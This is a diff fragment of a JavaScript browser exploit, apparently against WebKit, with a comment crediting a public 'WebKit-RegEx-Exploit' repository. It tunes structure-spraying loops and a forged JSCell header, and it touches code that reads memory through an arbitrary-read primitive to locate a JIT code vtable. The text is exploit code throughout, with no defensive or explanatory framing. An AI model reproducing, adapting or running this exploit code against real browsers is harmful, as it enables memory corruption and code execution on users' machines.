@@ -253,14 +253,14 @@ function foo(obj) {
         // copy paste from: 
         // https://github.com/LinusHenze/WebKit-RegEx-Exploit    
         var structs = [];
-        for (var i = 0; i < 0x10; i++) {
+        for (var i = 0; i < 0x5000; i++) {
             var a = new Float64Array(1);
             a['prop' + i] = 1337;
             structs.push(a);
         }
         
         log('[*] Spraying structures to get a butterfly (2/2)...');
-        for (var i = 0; i < 1000; i++) {
+        for (var i = 0; i < 50; i++) {
             var a = new WebAssembly.Memory({inital: 0});
             a['prop' + i] = 1337;
             structs.push(a);
@@ -273,7 +273,7 @@ function foo(obj) {
         var webAssemblyModule = new WebAssembly.Module(webAssemblyBuffer);
         
         var jsCellHeader = new Int64([
-            0x00, 0x10, 0x00, 0x00, 
+            0x00, 0x50, 0x00, 0x00, 
             0x0,                    
             0x2c,                   
             0x08,                  
@@ -513,9 +513,9 @@ function foo(obj) {
         //log('[+] Executable instance is at '+exe_ptr.toString(16));
         let v_tlb = memory.read_i64(exe_ptr,0);
         //log('[+] NativeJitCode vtable seems to be at '+v_tlb.toString(16));
-        var anchor = memory.read_i64(v_tlb,0);
+        //var anchor = memory.read_i64(v_tlb,0);
         //log('anchor' + anchor)
-        var hdr = Sub(anchor, anchor.lo() & 0xfff);
+        //var hdr = Sub(anchor, anchor.lo() & 0xfff);
         
 }
     
